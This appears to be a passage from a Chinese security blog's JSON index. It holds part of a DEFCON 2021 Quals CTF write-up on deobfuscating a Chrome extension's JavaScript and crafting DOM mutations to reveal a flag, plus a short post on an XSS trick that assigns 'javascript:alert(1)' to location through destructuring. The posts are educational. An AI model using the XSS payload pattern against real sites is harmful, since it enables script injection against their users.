本身就是解释型语言，我可以直接在 chrome devtools 中下断点，然后在 console 里打印我想要的变量值。最外层的函数不是特别多，所以依次下断点配合 devtools 的控制台获取变量。\n这段过程都是体力活，就不具体描述了，最后反混淆出了大致能看的 js 代码 readable_code.js。\n最后看下来，反混淆的部分是最重要的，因为后面的分析都不是很难。\n本地分析反混淆以后，可以看到在源码的最后有一段代码会定时向后台获取 flag 并输出。\nobserver[\"observe\"](document, config),\n    console[\"log\"](\"The observer is observing.\"),\n    setTimeout(function() &#123;\n      const _0xd26915 = &#123;&#125;;\n      _0xd26915[\"getflag\"] = _0x10b2d5[\"xOsuT\"], //true\n          chrome[\"runtime\"][\"sendMessage\"](_0xd26915, function(_0x336e82) &#123;\n            // _0x336382 is response from backend included with flag\n            FLAG = _0x336e82[\"flag\"],\n                console['log']((\"flag: \" + _0x336e82[\"flag\"]));\n\n            // four &amp;&amp; and display flag on the #thirdfactooor\n            nodesadded == 5 &amp;&amp; (nodesdeleted == 3) &amp;&amp; \\\n            attrcharsadded == 23 &amp;&amp; (domvalue == 2188) &amp;&amp; \\\n             (document[\"getElementById\"](\"thirdfactooor\")['value'] = _0x336e82[\"flag\"]);\n\n            // append new div\n            const _0x369bcb = document[\"createElement\"](\"div\");\n            _0x369bcb[\"setAttribute\"](\"id\", \"processed\"),\n                document[\"body\"][\"appendChild\"](_0x369bcb);\n          &#125;);\n    &#125;, 500);\n\n其中这个 document[&quot;getElementById&quot;](&quot;thirdfactooor&quot;) 是在 check_dom() 会进行的一项检查，我们需要让 html 中有一个 id 为 thirdfactooor 的 input 标签。\nif (document[\"querySelector\"](\"thirdfactooor\")[\"tagName\"] == \"INPUT\") &#123;&#125;\n\n只需要满足\nnodesadded == 5 &amp;&amp; (nodesdeleted == 3) &amp;&amp; attrcharsadded == 23 &amp;&amp; (domvalue == 2188)\n\n依次找到赋值的地方\n/*\n > _0x8a010b instanceof MutationRecord\n &lt;· true\n*/\nif (_0x8a010b[\"type\"] === \"childList\") &#123;\n    if (false) &#123;\n        // never execute\n    &#125; else &#123;\n        nodesadded += _0x8a010b[\"addedNodes\"][\"length\"],\n        nodesdeleted += _0x8a010b[\"removedNodes\"][\"length\"];\n    &#125;\n&#125; else &#123;\n    if ((_0x8a010b[\"type\"] === \"attributes\")) &#123;\n        if (true) &#123;\n            attrcharsadded += _0x8a010b[\"attributeName\"][\"length\"];\n        &#125;\n    &#125;\n&#125;\n在这里学习了一下 MutationRecode 的函数，MutationRecord JavaScript API。 type 会随着不同的操作改变\n\n改变 Node.childNodes 时会变成 childList\n改变  Element.attribute 时会变成 attributes\n\n按要求我们需要5次节点增加，3次节点移除，改变的属性名的长度总和为23。\n需要注意的是，在这段赋值操作前，有一处判断会导致程序提前退出。\nvar _0x5b12b9 = document[\"getElementById\"](\"3fa\");\n...\nif ((_0x8a010b[\"target\"] === _0x5b12b9) || \\\n_0x8a010b[\"target\"][\"parentNode\"] === _0x5b12b9 || \\\n_0x8a010b[\"target\"][\"parentNode\"][\"parentNode\"] === _0x5b12b9) &#123;&#125;\nelse return;\n\n所以 id 为 #3fa 的节点必须是根节点（可以直接给 &lt;html&gt; ）。\n接下来在调试的时候观察到 domvalue 与 .html 文件中的字数有关，凑足一定的字数即可。\n&lt;input id=\"thirdfactooor\" size=\"1000px\">\n&lt;script>\n    let fa = document.getElementsByTagName(\"html\")[0];\n    fa.setAttribute(\"id\", \"3fa\")\n    for(let i = 0; i &lt; 4; i++) &#123;\n        fa.lang = i; // 2 + 4 chars * 4 + 5\n    &#125;\n    let a = document.createElement(\"div\")\n    let b = document.createElement(\"div\")\n    let c = document.createElement(\"div\")\n    let d = document.createElement(\"div\")\n    let e = document.createElement(\"div\")\n    fa.appendChild(a)\n    fa.appendChild(b)\n    fa.appendChild(c)\n    fa.appendChild(d)\n    fa.appendChild(e)\n    fa.removeChild(a)\n    fa.removeChild(b)\n    fa.removeChild(c);\n    console.log(\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\")\n&lt;/script>\n\n直接放在本地跑，成功\n\nCapture the flag远程服务提供了一个 /submit 接口，可以提交我们的 html 文件，然后会用类似给这个 html “拍照”的方式，以图片格式返回。期间， html 文件里的 js 代码都会执行，但是 alert() 会引起报错，基本排除了 XSS 的可能。直接上传，DONE!\n\n\n总结第一次解出国际赛的题目，当能 getflag 的时候手都在抖。总体过程还是反混淆最折磨人，代码的逻辑并不复杂，getflag 也不需要绕太多的弯，只要能把 js 恢复出来就成功了大半。\n","categories":["JavaScript","De-Obfuscation"],"tags":["DEFCON 2021 Quals","Writeup"]},{"title":"JS trick in XSS","url":"https://0x4qe.github.io/JS trick in XSS/","content":"xss = \"javascript:alert(1)\";\n(&#123; xss: location &#125; = this);\n\n这里要提到解构赋值的概念，\n利用解构赋值，将属性/值从对象/数组中取出，并赋值给其他变量这里的圆括号是必须的\n\n于是我将问题提炼，问 kevin：(&#123;a:location&#125;=aa)为什么会使页面跳转？\n然后达成一致，是因为location的值发生了变化，然后浏览器强制刷新了。但我们关注到跳转后的页面后接的路由是根据a的值来的，有可能会出现/undefined的情况。\n然后这里我和 kevin 持两种不同的意见：\n我认为这里是因为首先根据&#123;a:location&#125;=this,把当前页面(this)的location赋值过去，然后根据a的值进行跳转。\nkevin 认为首先将this.a的值赋给了a.location，原因是a这个Object和window这个Object里都有a这个键。然后触发了解构赋值，a.location=this.a=&#39;javascript:alert(1)&#39;，最后成功触发了xss。\n关于poc可以看\n\n执行后的结果为：\n\n","categories":["JavaScript","XSS"],"tags":[]},{"title":"Start from scratch","url":"https://0x4qe.github.io/Start from scratch/","content":"now I want a new start\n","categories":[],"tags":[]}]